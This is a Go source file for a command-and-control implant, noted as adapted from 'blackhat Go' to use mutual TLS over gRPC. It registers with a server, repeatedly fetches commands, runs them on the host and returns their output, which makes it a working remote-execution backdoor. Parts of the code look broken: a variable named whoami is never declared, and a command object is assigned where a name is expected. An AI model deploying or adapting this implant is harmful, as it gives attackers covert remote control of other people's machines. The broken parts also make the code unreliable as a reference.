// Taken from blackhat Go, adapted for mTLS

package main

import (
	"context"
	"crypto/tls"
	"crypto/x509"
	"fmt"
	"io/ioutil"
	"log"
	"os/exec"
	"strings"
	"time"

	"github.com/matt-culbert/Switchblade/grcpapi/implant.proto"
	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials"
)

// Register holds the beacon name

func loadTLSCredentials() (credentials.TransportCredentials, error) {
	// Load certificate of the CA who signed server's certificate
	pemServerCA, err := ioutil.ReadFile("/etc/server/certs/ca.crt")
	if err != nil {
		return nil, err
	}

	certPool := x509.NewCertPool()
	if !certPool.AppendCertsFromPEM(pemServerCA) {
		return nil, fmt.Errorf("failed to add server CA's certificate")
	}

	// Load client's certificate and private key
	clientCert, err := tls.LoadX509KeyPair("/etc/server/certs/server.crt", "/etc/server/certs/server.key")
	if err != nil {
		return nil, err
	}

	// Create the credentials and return it
	config := &tls.Config{
		Certificates: []tls.Certificate{clientCert},
		RootCAs:      certPool,
	}

	return credentials.NewTLS(config), nil
}

func main() {
	var (
		opts   []grpc.DialOption
		conn   *grpc.ClientConn
		err    error
		client grpcapi.ImplantClient
	)

	var name = exec.Command("hostname") // generate a client name on first launch

	whoami.Register = name // register is defined in proto as a string

	tlsCredentials, err := loadTLSCredentials()
	if err != nil {
		log.Fatal("cannot load TLS credentials: ", err)
	}

	opts = append(opts, grpc.WithTransportCredentials(tlsCredentials))
	if conn, err = grpc.Dial(fmt.Sprintf("localhost:%d", 8010),
		grpc.WithTransportCredentials(tlsCredentials)); err != nil {
		log.Fatal(err)
	}
	defer conn.Close()
	ctx := context.Background()

	client = grpcapi.NewImplantClient(conn)
	client.RegisterImplant(ctx, whoami) // RegisterImplant is defined in proto as taking in a string and has no output

	for {
		var req = new(grpcapi.Empty)
		cmd, err := client.FetchCommand(ctx, req)
		if err != nil {
			log.Fatal(err)
		}
		if cmd.In == "" {
			// No work
			time.Sleep(3 * time.Second)
			continue
		}

		tokens := strings.Split(cmd.In, " ")
		var c *exec.Cmd
		if len(tokens) == 1 {
			c = exec.Command(tokens[0])
		} else {
			c = exec.Command(tokens[0], tokens[1:]...)
		}
		buf, err := c.CombinedOutput()
		if err != nil {
			cmd.Out = err.Error()
		}
		cmd.Out += string(buf)
		client.SendOutput(ctx, cmd)
	}
}
